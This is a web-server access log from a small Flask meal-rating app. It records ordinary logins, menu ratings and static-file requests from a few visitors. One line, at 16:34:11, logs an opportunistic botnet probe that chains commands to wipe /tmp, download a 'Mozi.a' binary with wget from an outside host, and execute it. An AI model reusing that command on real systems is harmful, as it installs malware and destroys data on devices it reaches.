python3: can't open file './arambyeol/__init__.py': [Errno 2] No such file or directory
 * Serving Flask app '__init__' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.0.0.29:5000/ (Press CTRL+C to quit)
203.255.3.172 - - [23/Nov/2021 16:23:37] "GET /member/login.html HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:23:37] "GET /static/css/member/login.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:37] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:37] "GET /favicon.ico HTTP/1.1" 404 -
203.255.3.172 - - [23/Nov/2021 16:23:43] "POST /member/login.html HTTP/1.1" 302 -
203.255.3.172 - - [23/Nov/2021 16:23:43] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:23:44] "GET /static/images/logout.png HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:23:51] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /static/images/logout.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:17] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:26:18] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:26:18] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:27:06] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:27:08] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/images/logout.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:33] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/images/logout.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:46] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:48] "POST /logout HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:48] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:30:49] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:17] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:32:59] "GET /static/images/favicon.ico HTTP/1.1" 304 -
120.86.236.160 - - [23/Nov/2021 16:34:11] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:36:53] "GET /static/images/favicon.ico HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET / HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/css/index.css HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/images/x_icon.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/js/index.js HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/images/empty_star.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/images/logo.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "POST /api/session_check HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /static/images/login.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:37:38] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:44] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:45] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:45] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:45] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:45] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:46] "GET /member/login.html HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:46] "GET /static/css/member/login.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:46] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:49] "GET /member/login.html HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:37:49] "GET /static/css/member/login.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:37:49] "GET /static/images/logo.png HTTP/1.1" 304 -
104.194.8.56 - - [23/Nov/2021 16:37:50] "GET https://api.tha79.com/tha79/app/download/list HTTP/1.1" 404 -
203.255.3.172 - - [23/Nov/2021 16:37:54] "GET /static/css/member/login.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:38:08] "GET /static/images/login.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET / HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/css/index.css HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/images/x_icon.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/js/index.js HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/images/logo.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/images/empty_star.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "POST /api/session_check HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /static/images/login.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:39:54] "GET /api/list HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET / HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET /static/css/index.css HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET /static/js/index.js HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET /static/images/logo.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET /static/images/x_icon.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "GET /static/images/empty_star.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:40:05] "POST /api/session_check HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:06] "GET /api/list HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:06] "GET /static/images/login.png HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:40:10] "GET /static/css/index.css HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:40:11] "GET / HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:11] "GET /static/css/index.css HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:11] "GET /static/js/index.js HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:12] "GET /static/images/logo.png HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:12] "GET /static/images/x_icon.png HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:12] "GET /static/images/empty_star.png HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:12] "POST /api/session_check HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:12] "GET /api/list HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:13] "GET /static/images/login.png HTTP/1.1" 200 -
182.31.164.169 - - [23/Nov/2021 16:40:13] "GET /static//images/favicon.ico HTTP/1.1" 308 -
182.31.164.169 - - [23/Nov/2021 16:40:13] "GET /static/images/favicon.ico HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:04] "GET /static/images/favicon.ico HTTP/1.1" 304 -
182.31.164.169 - - [23/Nov/2021 16:42:29] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:42:57] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:34] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:35] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:41] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:42] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:43] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:44:45] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:44:46] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:45:03] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:45:04] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:44] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:45] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:49] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:47:50] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:48:25] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/css/index.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/js/index.js HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/images/empty_star.png HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/images/logo.png HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/images/x_icon.png HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/images/login.png HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static//images/favicon.ico HTTP/1.1" 308 -
203.255.3.172 - - [23/Nov/2021 16:48:49] "GET /static/images/favicon.ico HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:48:51] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET /static/js/index.js HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET /static/images/x_icon.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET /static/images/empty_star.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "GET /static/images/logo.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:12] "POST /api/session_check HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:49:13] "GET /static/images/login.png HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:49:13] "GET /api/list HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:49:13] "GET /static/images/favicon.ico HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:50:07] "POST /api/menu_score HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:50:09] "GET /member/login.html HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:50:09] "GET /static/css/member/login.css HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:50:09] "GET /favicon.ico HTTP/1.1" 404 -
203.255.3.172 - - [23/Nov/2021 16:50:12] "GET / HTTP/1.1" 200 -
203.255.3.172 - - [23/Nov/2021 16:50:12] "GET /static/css/index.css HTTP/1.1" 304 -
203.255.3.172 - - [23/Nov/2021 16:50:12] "GET /static/js/index.js HTTP/1.1" 304 -
